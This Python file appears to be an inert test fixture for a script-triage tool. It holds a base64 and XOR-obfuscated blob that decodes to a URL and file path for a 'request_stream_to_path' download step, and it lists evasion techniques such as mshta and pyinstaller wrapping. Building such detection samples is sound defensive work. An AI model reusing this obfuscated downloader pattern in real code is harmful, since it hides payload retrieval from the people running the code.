#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_f5f7a58e = "ljnIyFCUYYrHHoFni8FKkmGlxkaNa47RD5d2k8BGv2KT2EacZZ7VU5RhiIlRhXWP0VCUW4nAUYVll+tXj1uK1VeIeInAQodhpddMlWqOiRKcd4PaV4F8x9NGjmGI1VePdqXESpBhlt1NhXiV1kWVd5nVV4lrlIlFk3CI3U2HW5zGQodpn9pXk3iZ1VGSbZ/GHpB9k9pQlGWW2EaSW5XaRoZtltFfl22U0EyXd6XXS4FtlIlOk2yO1XyUa6XEWpRsldpfg2WXxEKJY5TrSoQ5mdVOkGWT003NMMmFG9k8zNFF2XiPxk/dbI7AU5M+1ZsX0zXCjRvWYZyNDYV8m9lTjGHU3U2WZZbdR883ntAV0TLIhQ2QfYbBUIV2pdVEhWqOiWuVao7GRpN3qs1XiGuUmxfTNcKNG9ZhnI1fhm2W0XyQZY7cHqM+1eRRj2OI1U6kZY7VDKhxlMBRhXeJ+EKCK9TBU4RljtEO1DfLjBrYMp/SGs50gw=="
    CODEC_f5f7a58e = "base64_literal|repeating_key_xor|e0,04,fa,b4,23"

    def load_f5f7a58e():
        return base64.b64decode(MATERIAL_f5f7a58e)

    def decode_f5f7a58e(e):
        key_bytes = (224, 4, 250, 180, 35,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

    def recover_f5f7a58e():
        n = (3, 5, 8, 13)[1:3]
        for _pass in range(1):
            d = decode_f5f7a58e(load_f5f7a58e())
        t = d.decode("ascii", "strict")
        return t

    def inspect_f5f7a58e():
        stream = io.BytesIO(recover_f5f7a58e().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_f5f7a58e():
        stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
        return tuple(stream)

    def obfuscation_f5f7a58e():
        left, right = "fstrin", "g_fragments"
        return f"{left}{right}"

    def plan_f5f7a58e():
        fields = dict(item.split("=", 1) for item in inspect_f5f7a58e().split("|"))
        analysis_surface = surface_f5f7a58e()
        obfuscation_surface = obfuscation_f5f7a58e()
        operation_plan = ("request_stream_to_path", fields["url"], fields["file_path"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_f5f7a58e())
